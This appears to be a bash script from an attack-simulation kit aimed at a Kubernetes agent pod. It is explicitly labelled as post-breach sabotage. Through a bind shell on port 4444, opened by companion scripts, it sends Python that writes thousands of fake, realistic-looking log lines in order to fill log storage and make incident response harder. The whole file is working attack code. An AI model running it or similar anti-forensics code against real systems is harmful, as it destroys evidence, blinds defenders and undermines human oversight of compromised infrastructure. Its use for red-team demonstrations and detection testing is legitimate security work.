#!/usr/bin/env bash
# Sabotage: generate massive log output to fill storage and hinder incident response.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-log-flood.sh [--lines COUNT]"
  echo "  Generates high-volume log output to stdout on the agent pod."
  echo "  Fills log storage and makes incident response harder."
  echo "  Default: 10000 lines."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

LINE_COUNT=10000
while [[ $# -gt 0 ]]; do
  case "$1" in
    --lines) LINE_COUNT="$2"; shift 2 ;;
    *) shift ;;
  esac
done

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: Log Flooding"
echo "@PHASE Log-Flood"

PYTHON_CODE='
import time, random, string, os, sys

line_count = int('$LINE_COUNT')

print("@PHASE Generate-Logs")
print("=" * 60)
print("  SABOTAGE: Log Flooding")
print("=" * 60)
print(f"  Lines to generate: {line_count}")
print(f"@FINDING high Generating {line_count} fake log lines to pollute log pipeline")
print()

levels = ["INFO", "DEBUG", "WARN", "ERROR", "TRACE"]
components = [
    "inventory.api", "inventory.auth", "inventory.pool",
    "inventory.cache", "inventory.metrics", "inventory.scheduler",
    "auth.session", "auth.oauth", "db.connector", "db.migration"
]
messages = [
    "Request processed successfully",
    "Cache miss for key {}",
    "Connection pool health check passed",
    "Metrics exported: {} datapoints",
    "Session validated for user {}",
    "Background job completed in {}ms",
    "Database query executed: {} rows affected",
    "Rate limit check: {}/1000 requests",
    "Health probe returned 200",
    "TLS certificate valid for {} days",
]

print("  Flooding started...")
start = time.time()

for i in range(line_count):
    ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    level = random.choice(levels)
    comp = random.choice(components)
    msg = random.choice(messages).format(
        "".join(random.choices(string.ascii_lowercase, k=8))
    )
    line = f"[{ts}] {level:5s} {comp} - {msg}"
    # Write to stdout (captured by container logging)
    sys.stdout.write(line + "\n")
    if i % 1000 == 0 and i > 0:
        sys.stdout.flush()

elapsed = time.time() - start
rate = line_count / elapsed if elapsed > 0 else 0

print()
print(f"  Generated {line_count} log lines in {elapsed:.1f}s ({rate:.0f} lines/sec)")
print("  Log storage is now polluted. Incident response will be harder.")
print(f"@RESULT success Generated {line_count} log lines in {elapsed:.1f}s ({rate:.0f}/sec)")
print()
print("Log flooding complete.")
'

echo "  Lines: $LINE_COUNT"
echo "  Piping log flooding script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Log flooding complete."
